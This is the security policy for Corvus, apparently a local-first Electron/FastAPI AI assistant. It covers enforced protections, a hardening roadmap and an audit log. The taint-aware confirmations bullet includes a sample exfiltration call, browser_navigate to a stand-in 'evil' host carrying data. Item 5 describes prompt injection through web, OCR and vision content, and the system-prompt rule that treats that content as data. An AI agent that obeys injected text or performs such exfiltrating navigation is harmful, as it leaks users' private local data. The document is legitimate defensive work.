# Corvus Security

Corvus is local-first: the LLM (Ollama), conversation history, memories, and logs all live on the user's machine. The FastAPI backend binds to `127.0.0.1` only and is never exposed to the network. This document tracks the security posture: what is already enforced, and the hardening roadmap with live status.

## Reporting a vulnerability

Open a private security advisory on GitHub (Security → Advisories → Report a vulnerability) rather than a public issue.

## Already enforced

- Backend binds loopback only, on a random free port chosen per launch; nothing listens on external interfaces. Before trusting it, Electron proves the listener is its own child: `GET /handshake?nonce=…` must return `HMAC-SHA256(launch token, nonce)`, so a process squatting the port can't impersonate the backend. The backend exits when its Electron parent dies (`CORVUS_PARENT_PID` watchdog).
- Consent routes (plugin install/enable/permission grants, "delete all my data") need a second secret, `CORVUS_ADMIN_TOKEN`, held only by the Electron main process. It calls them after a native dialog the renderer can't draw or click, so a compromised renderer can't grant itself plugin permissions.
- API keys for optional cloud providers are encrypted with Windows DPAPI (user-scoped) and stored base64 in SQLite — never plaintext on disk (verified by scanning the raw DB file).
- Agent actions are risk-tiered (`safe`/`low`/`medium`/`high`); `medium`/`high` always require explicit user confirmation stating the exact consequence. Voice mode cannot trigger actions (confirmations need the visible card).
- **Taint-aware confirmations.** Actions whose output carries outside content (web pages, OCR, image descriptions, document search, clipboard, plugin output) mark the turn tainted; after that, every non-`safe` action needs confirmation, naming the source. Injected text can't chain a silent read into a silent `browser_navigate("https://evil/?d=…")`. `tests/test_security.py` pins the full list of no-confirm actions, so adding one fails CI until reviewed.
- **Cloud egress.** With a cloud provider active, actions that put local data (screen, files, documents, clipboard) into the conversation ask first, naming the provider. Settings → Privacy & Data lists every request that left the machine this session (destination, kind, size; never content).
- Action arguments are validated against each action's JSON schema (types, enums, bounds) before confirmation or execution.
- Deletes go to the Recycle Bin (`SHFileOperationW` + `FOF_ALLOWUNDO`). `close_app` no longer force-kills.
- Corvus's own browser refuses loopback, private, link-local and reserved addresses, including after redirects (Playwright route guard). DNS rebinding is out of scope.
- Corvus never types stored passwords — login flows hand off to the browser's own credential manager after per-site consent.
- Electron renderer is locked down: `contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`, minimal typed IPC bridge.
- `openPath` IPC opens only an allowlist of document/media extensions inside the Corvus data dir (others are revealed in Explorer, never executed); `openExternal` only accepts `http(s)` URLs. Navigation is allowed only to the exact bundled `index.html` (no other `file://` path, no UNC host). Production CSP has no dev-server origins and no inline script.
- The Ollama installer download is run only if its Authenticode signature is valid and signed by Ollama.
- No telemetry: Sentry was removed.
- Single-instance lock prevents a second Corvus from racing the first.
- The backend fails closed: if no launch token is provided it mints a random one (never open, never logged), so the API is always authenticated.
- Voice Studio filenames and the Piper voice download are constrained: generated audio filenames are reduced to a safe character set (no traversal), and voice downloads accept only ids from the built-in catalog (no arbitrary-URL fetch / SSRF).

## Hardening roadmap

Status legend: ✅ done · 🔲 pending

| # | Priority | Item | Status |
|---|----------|------|--------|
| 1 | **P1** | **Backend API authentication** — Electron generates a random token per launch, passes it to the spawned backend, and every HTTP request and WebSocket handshake must present it. Blocks any other local process from reading conversations or driving the agent. `/health` stays open for liveness checks. | ✅ done |
| 2 | **P1** | **Auto-update feed hijack** — `electron-builder.yml` pointed at `updates.corvus.app`, a placeholder domain nobody owns; whoever registers it could serve malicious "updates". Point the feed at this repo's GitHub Releases instead. | ✅ done |
| 3 | P2 | **Code-sign the installer** — unsigned builds trigger SmartScreen and give the updater no signature to verify. Requires a paid certificate (OV/EV or Azure Trusted Signing); until then updates are notify-only in spirit. | 🔲 pending (needs certificate purchase) |
| 4 | P2 | **Plugin trust model** — plugins are Python loaded in-process; manifest permissions gate registry actions but not arbitrary code. Enabling a plugin (via a native dialog) pins a SHA-256 hash of every file in the plugin, manifest included; if the code on disk changes, the plugin refuses to load until the user disables and re-enables it (re-approval). The hash is shown on the plugin card. Full process sandboxing deferred until a marketplace exists. | ✅ done |
| 5 | P2 | **Prompt-injection hardening** — web page text, OCR output, and vision descriptions are wrapped in `<<<UNTRUSTED_CONTENT>>>` delimiters (embedded fakes stripped), and the agent system prompt declares the wrapped region to be data, never instructions. Risk-tier confirmations remain the hard barrier. | ✅ done |
| 6 | P3 | **Electron navigation guards** — `will-navigate` denies anything that isn't local Corvus content, and `setWindowOpenHandler` denies all new windows; http(s) links open in the system browser instead. | ✅ done |
| 7 | P3 | **Tighten CORS** — allowed origins are now `null`/`file://` (packaged renderer) plus the Vite dev-server origins only when running from source (never in a frozen build); moot in depth once item 1 landed. | ✅ done |
| 8 | P3 | **Data at rest** — message bodies never reach the log file. Messages, memories, action-log arguments/results, reminders, workflow steps, voiceover text and media prompts are Fernet-encrypted with a DPAPI-wrapped key. **Not encrypted:** the RAG full-text index (FTS5 must read it; the indexed source files are plaintext on disk anyway) and conversation titles/workflow names (used for lookups). Retention settings expire screenshots/uploads (default 30 days); backups are passphrase-encrypted (scrypt + Fernet) and never include API keys; "Delete all my data" wipes everything except downloaded models. | ✅ done |
| 9 | P3 | **Upload endpoint hardening** — `/upload` streams to disk in 1 MB chunks with a 50 MB cap (413 beyond it, partial file removed) and reduces filenames to a safe character set (no separators, no traversal). The input bar also filters by type and size client-side. | ✅ done |
| 10 | P3 | **Supply chain** — Dependabot watches npm (root + frontend), pip, and GitHub Actions weekly; a `security` CI workflow runs the naming guard, `npm audit`, and `pip-audit` on every push/PR and weekly. Every Action is pinned to a commit SHA; workflows default to `contents: read` and only the tag-release job can write. | ✅ done |

Items are checked off in this file in the same commit that implements them.

## Audit log

**2026-07-16 — full review after Voice Studio, setup wizard, and model-manager features.**

- **New endpoints reviewed** (`/system/specs`, `/studio/*`, onboarding settings): all sit behind the global launch-token middleware. `nvidia-smi` runs with a fixed argument list (no shell, no user input). Piper downloads are catalog-gated — an unknown voice id raises before any HTTP request, so there is no SSRF or arbitrary-file-write vector. Fixed: generated-audio filenames now sanitize the user-supplied voice id.
- **`openPath` prefix check hardened** — was a bare `startsWith` (a sibling like `…\CorvusEvil` could slip through and it was case-sensitive on case-insensitive NTFS); now anchored on the path separator and case-insensitive.
- **Token fallback no longer logs the token** — the generated fallback token was being written to the on-disk log (readable through `/logs`); now only a flag is logged.
- **Dependency audit.** `pip-audit`: findings are only in the build toolchain (`pip`, `setuptools`) that PyInstaller does not bundle into the frozen backend — no runtime exposure; refresh the venv toolchain opportunistically. `npm audit`: all 18 findings are in **dev/build dependencies** (electron-builder→tar, vite/vitest/esbuild dev server, react-syntax-highlighter→prismjs, electron ASAR-integrity). None are reachable in the packaged app: the Vite/vitest/esbuild dev server never ships; `tar` is used only at build time; the Electron ASAR advisory is mitigated in depth by our nav guards + sandbox and is fully resolved by a major Electron bump. **Action:** schedule an Electron major-version upgrade (breaking) and a `react-syntax-highlighter` bump in a dedicated dependency PR; do not `npm audit fix --force` mid-feature.

**2026-11-17 — prompt-injection and local-trust hardening.** Taint-aware confirmations, cloud-egress warnings and log, schema validation, Recycle Bin deletes, random port + HMAC handshake, admin token for consent routes, whole-plugin hashing, encryption of the remaining sensitive columns, retention/backup/wipe, SSRF guard in the automation browser, stricter navigation/CSP, signed-installer check for Ollama, Sentry removed, SHA-pinned CI. Regression tests: `backend/tests/test_security.py`, `test_fuzz.py` (hypothesis), `frontend/electron/guards.test.ts`, Playwright e2e with a scripted provider.

**2026-08-07 — dependency bump follow-up.**

- **Dependency audit.** Completed the scheduled Electron and `react-syntax-highlighter` major version bumps (now on Electron 43 and react-syntax-highlighter 16). Addressed the lingering `js-yaml` vulnerability blocking `npm audit` by updating Vite peer dependencies and running `npm audit fix`, resolving all high-severity findings. `npm run audit` now passes cleanly.
